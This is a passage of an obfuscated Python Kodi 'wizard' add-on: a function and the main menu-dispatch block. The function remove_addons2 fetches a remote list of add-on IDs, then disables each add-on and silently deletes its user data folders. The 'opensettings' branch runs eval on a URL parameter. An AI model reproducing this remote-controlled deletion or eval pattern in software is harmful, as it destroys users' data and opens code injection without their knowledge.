	except :pass #line:5565
def remove_addons2 ():#line:5566
	try :#line:5567
			import json #line:5568
			OO0000OOO00O00000 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5569
			for OOO0OOOOO0O000OOO in OO0000OOO00O00000 :#line:5570
				O000O0OOOOO00000O =OOO0OOOOO0O000OOO .split (':')[1 ].strip ()#line:5572
				O00OO00OOO00O00OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O000O0OOOOO00000O ,'false')#line:5573
				O0OO00000000O000O =xbmc .executeJSONRPC (O00OO00OOO00O00OO )#line:5574
				O00O000OOOOO0OOOO =json .loads (O0OO00000000O000O )#line:5575
				O0000000OOOO0OOOO =os .path .join (user_folder ,O000O0OOOOO00000O )#line:5577
				if os .path .exists (O0000000OOOO0OOOO ):#line:5579
					for O0OO00000OOOOO00O ,OO0OO0O00OOOO0O00 ,OO0OO0O0OOO00OO0O in os .walk (O0000000OOOO0OOOO ):#line:5580
						for O000OOO00O0OO0OOO in OO0OO0O0OOO00OO0O :#line:5581
							os .unlink (os .path .join (O0OO00000OOOOO00O ,O000OOO00O0OO0OOO ))#line:5582
						for OO000000OOOO000O0 in OO0OO0O00OOOO0O00 :#line:5583
							shutil .rmtree (os .path .join (O0OO00000OOOOO00O ,OO000000OOOO000O0 ))#line:5584
					os .rmdir (O0000000OOOO0OOOO )#line:5585
	except :pass #line:5587
params =get_params ()#line:5588
url =None #line:5589
name =None #line:5590
mode =None #line:5591
try :mode =urllib .unquote_plus (params ["mode"])#line:5593
except :pass #line:5594
try :name =urllib .unquote_plus (params ["name"])#line:5595
except :pass #line:5596
try :url =urllib .unquote_plus (params ["url"])#line:5597
except :pass #line:5598
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5600
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5601
def setView (OO0OOOO0O00OOO0OO ,O00O00O000O0OO0OO ):#line:5602
	if wiz .getS ('auto-view')=='true':#line:5603
		OO0OOO00OO000O000 =wiz .getS (O00O00O000O0OO0OO )#line:5604
		if OO0OOO00OO000O000 =='50'and KODIV >=17 and SKIN =='skin.estuary':OO0OOO00OO000O000 ='55'#line:5605
		if OO0OOO00OO000O000 =='500'and KODIV >=17 and SKIN =='skin.estuary':OO0OOO00OO000O000 ='50'#line:5606
		wiz .ebi ("Container.SetViewMode(%s)"%OO0OOO00OO000O000 )#line:5607
if mode ==None :index ()#line:5609
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5611
elif mode =='builds':buildMenu ()#line:5612
elif mode =='viewbuild':viewBuild (name )#line:5613
elif mode =='buildinfo':buildInfo (name )#line:5614
elif mode =='buildpreview':buildVideo (name )#line:5615
elif mode =='install':buildWizard (name ,url )#line:5616
elif mode =='theme':buildWizard (name ,mode ,url )#line:5617
elif mode =='viewthirdparty':viewThirdList (name )#line:5618
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5619
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5620
elif mode =='maint':maintMenu (name )#line:5622
elif mode =='passpin':passandpin ()#line:5623
elif mode =='backmyupbuild':backmyupbuild ()#line:5624
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5625
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5626
elif mode =='advancedsetting':advancedWindow (name )#line:5627
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5628
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5629
elif mode =='asciicheck':wiz .asciiCheck ()#line:5630
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5631
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5632
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5633
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5634
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5635
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5636
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5637
elif mode =='currentsettings':viewAdvanced ()#line:5638
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5639
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5640
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5641
elif mode =='fixskin':backtokodi ()#line:5642
elif mode =='testcommand':testcommand ()#line:5643
elif mode =='logsend':logsend ()#line:5644
elif mode =='rdon':rdon ()#line:5645
elif mode =='rdoff':rdoff ()#line:5646
elif mode =='setrd':setrealdebrid ()#line:5647
elif mode =='setrd2':setautorealdebrid ()#line:5648
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5649
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5650
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5651
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5652
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5653
elif mode =='freshstart':freshStart ()#line:5654
elif mode =='forceupdate':wiz .forceUpdate ()#line:5655
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5656
elif mode =='forceclose':wiz .killxbmc ()#line:5657
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5658
elif mode =='hidepassword':wiz .hidePassword ()#line:5659
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5660
elif mode =='enableaddons':enableAddons ()#line:5661
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5662
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5663
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5664
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5665
elif mode =='uploadlog':uploadLog .Main ()#line:5666
elif mode =='viewlog':LogViewer ()#line:5667
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5668
elif mode =='viewerrorlog':errorChecking (all =True )#line:5669
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5670
elif mode =='purgedb':purgeDb ()#line:5671
elif mode =='fixaddonupdate':fixUpdate ()#line:5672
elif mode =='removeaddons':removeAddonMenu ()#line:5673
elif mode =='removeaddon':removeAddon (name )#line:5674
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5675
elif mode =='removedata':removeAddonData (name )#line:5676
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5677
elif mode =='systeminfo':systemInfo ()#line:5678
elif mode =='restorezip':restoreit ('build')#line:5679
elif mode =='restoregui':restoreit ('gui')#line:5680
elif mode =='restoreaddon':restoreit ('addondata')#line:5681
elif mode =='restoreextzip':restoreextit ('build')#line:5682
elif mode =='restoreextgui':restoreextit ('gui')#line:5683
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5684
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5685
elif mode =='traktsync':traktsync ()#line:5686
elif mode =='apk':apkMenu (name )#line:5688
elif mode =='apkscrape':apkScraper (name )#line:5689
elif mode =='apkinstall':apkInstaller (name ,url )#line:5690
elif mode =='speed':speedMenu ()#line:5691
elif mode =='net':net_tools ()#line:5692
elif mode =='GetList':GetList (url )#line:5693
elif mode =='youtube':youtubeMenu (name )#line:5694
elif mode =='viewVideo':playVideo (url )#line:5695
elif mode =='addons':addonMenu (name )#line:5697
elif mode =='addoninstall':addonInstaller (name ,url )#line:5698
elif mode =='savedata':saveMenu ()#line:5700
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5701
elif mode =='managedata':manageSaveData (name )#line:5702
elif mode =='whitelist':wiz .whiteList (name )#line:5703
elif mode =='trakt':traktMenu ()#line:5705
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5706
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5707
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5708
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5709
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5710
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5711
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5712
elif mode =='realdebrid':realMenu ()#line:5714
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5715
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5716
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5717
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5718
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5719
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5720
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5721
elif mode =='login':loginMenu ()#line:5723
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5724
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5725
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5726
elif mode =='clearlogin':loginit .clearSaved (name )#line:5727
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5728
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5729
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5730
elif mode =='contact':notify .contact (CONTACT )#line:5732
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5733
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5734
elif mode =='developer':developer ()#line:5736
elif mode =='converttext':wiz .convertText ()#line:5737
elif mode =='createqr':wiz .createQR ()#line:5738
elif mode =='testnotify':testnotify ()#line:5739
elif mode =='testnotify2':testnotify2 ()#line:5740
elif mode =='servicemanual':servicemanual ()#line:5741
elif mode =='fastinstall':fastinstall ()#line:5742
elif mode =='testupdate':testupdate ()#line:5743
elif mode =='testfirst':testfirst ()#line:5744
elif mode =='testfirstrun':testfirstRun ()#line:5745
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5746
elif mode =='bg':wiz .bg_install (name ,url )#line:5748
elif mode =='bgcustom':wiz .bg_custom ()#line:5749
elif mode =='bgremove':wiz .bg_remove ()#line:5750
elif mode =='bgdefault':wiz .bg_default ()#line:5751
elif mode =='rdset':rdsetup ()#line:5752
elif mode =='mor':morsetup ()#line:5753
elif mode =='mor2':morsetup2 ()#line:5754
elif mode =='resolveurl':resolveurlsetup ()#line:5755
elif mode =='urlresolver':urlresolversetup ()#line:5756
elif mode =='forcefastupdate':forcefastupdate ()#line:5757
elif mode =='traktset':traktsetup ()#line:5758
elif mode =='placentaset':placentasetup ()#line:5759
elif mode =='flixnetset':flixnetsetup ()#line:5760
elif mode =='reptiliaset':reptiliasetup ()#line:5761
elif mode =='yodasset':yodasetup ()#line:5762
elif mode =='numbersset':numberssetup ()#line:5763
elif mode =='uranusset':uranussetup ()#line:5764
elif mode =='genesisset':genesissetup ()#line:5765
elif mode =='fastupdate':fastupdate ()#line:5766
elif mode =='folderback':folderback ()#line:5767
elif mode =='menudata':Menu ()#line:5768
elif mode ==2 :#line:5770
        wiz .torent_menu ()#line:5771
elif mode ==3 :#line:5772
        wiz .popcorn_menu ()#line:5773
elif mode ==8 :#line:5774
        wiz .metaliq_fix ()#line:5775
elif mode ==9 :#line:5776
        wiz .quasar_menu ()#line:5777
elif mode ==5 :#line:5778
        swapSkins ('skin.Premium.mod')#line:5779
elif mode ==13 :#line:5780
        wiz .elementum_menu ()#line:5781
elif mode ==16 :#line:5782
        wiz .fix_wizard ()#line:5783
elif mode ==17 :#line:5784
        wiz .last_play ()#line:5785
elif mode ==18 :#line:5786
        wiz .normal_metalliq ()#line:5787
elif mode ==19 :#line:5788
        wiz .fast_metalliq ()#line:5789
elif mode ==20 :#line:5790
        wiz .fix_buffer2 ()#line:5791
elif mode ==21 :#line:5792
        wiz .fix_buffer3 ()#line:5793
elif mode ==11 :#line:5794
        wiz .fix_buffer ()#line:5795
elif mode ==15 :#line:5796
        wiz .fix_font ()#line:5797
elif mode ==14 :#line:5798
        wiz .clean_pass ()#line:5799
elif mode ==22 :#line:5800
        wiz .movie_update ()#line:5801
elif mode =='adv_settings':buffer1 ()#line:5802
elif mode =='getpass':getpass ()#line:5803
elif mode =='setpass':setpass ()#line:5804
elif mode =='setuname':setuname ()#line:5805
elif mode =='passandUsername':passandUsername ()#line:5806
elif mode =='9':disply_hwr ()#line:5807
elif mode =='99':disply_hwr2 ()#line:5808
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))